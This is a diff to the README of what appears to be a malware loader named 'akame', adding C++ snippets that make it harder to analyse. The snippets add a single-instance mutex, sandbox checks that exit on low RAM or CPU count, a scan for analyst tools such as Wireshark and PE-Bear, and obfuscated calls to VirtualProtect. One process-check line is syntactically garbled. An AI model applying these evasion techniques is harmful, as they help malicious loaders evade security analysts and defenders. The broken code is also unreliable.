@@ -100,9 +100,64 @@ The loader was build with VS22 and signed with a sha1 certificate
 Link: https://www.virustotal.com/gui/file/68e6a25457093584a043ed3f721be9bc9b6456edd792cb4e30054e85bdc4119f?nocache=1
 
 ## What should be added to make it more advanced / functional?
-- More anti analysis techniques (checking for suspicious files, directories, processes and windows' names) <br>
+- Create Mutex to avoid running multiple instances of akame on the same machine. POC:
+```cpp
+    // Check the mutex at the beginning
+    if (OpenMutex(MUTEX_ALL_ACCESS, 0, L"MUTEX_RANDOM_STRING"))
+        return 0;
+
+    // Create mutex
+    CreateMutex(0, 0, L"MUTEX_RANDOM_STRING");
+```
+- More anti analysis techniques (functions that check for suspicious files, directories, processes, windows' names, etc.)
+```cpp
+    // A simple hard-disk check is already done, but we can as well check the available RAM / CPU
+    
+    // If the machine has less than 2048mb (2gb) of ram -> exit 
+    MEMORYSTATUSEX memoryStatus;
+    memoryStatus.dwLength = sizeof(memoryStatus);
+    GlobalMemoryStatusEx(&memoryStatus);
+    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
+    if (RAMMB < 2048) return 0;
+    
+    // If the machine has less than 2 logical processors -> exit
+    SYSTEM_INFO systemInfo;
+    GetSystemInfo(&systemInfo);
+    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
+    if (numberOfProcessors < 2) return false;
+    
+    // Check for specific running processes that are usually used in malware analysis, like WireShark, PE-Bear, ProcMon, IDA, X64/X32 DBG, etc.
+    PROCESSENTRY32W processEntry = { 0 };
+    processEntry.dwSize = sizeof(PROCESSENTRY32W);
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    WCHAR processName[MAX_PATH + 1];
+    if (Process32FirstW(hSnapshot, &processEntry))
+    {
+      do
+      {
+        StringCchCopyW(processName, MAX_PATH, processEntry.szExeFile);
+        CharUpperW(processName);
+        if (wcsstr(processName, L"WIRESHARK.EXE") || wcsstr(processName), L"PE-BEAR.EXE" || wcsstr(processName), L".EXE" || ...)
+          return 0;
+      } while (Process32NextW(hSnapshot, &processEntry));
+    }
+```
 - Anti debugging (detecting analysis in general) <br>
-- Anti static analysis (function call obfuscation and also finding kernel32 location in the process environment block to avoid using GetModuleHandle() and GetProcAddress())<br>
+- Anti static analysis (function call obfuscation and also finding kernel32 location in the process environment block to avoid using GetModuleHandle() and GetProcAddress())
+```cpp
+// EXAMPLE
+BOOL (WINAPI*pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+
+pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect"); // Encrypt VirtualProtect with encrypt.exe, don't paste the plain text
+
+// Call pVirtualProtect instead of VirtualProtect
+BOOL rv = pVirtualProtect(...);
+
+/* With this method, we use GetModuleHandle and GetProcAddress, this can be even more suspicious, some workarounds:
+* API Hashing to hide GetProcAddress
+* Bootstrapping to hide GetModuleHandle
+*/
+```
 - Adding 'fake' imports to fill the import table and make it look more legitimate
 
 ## Properties
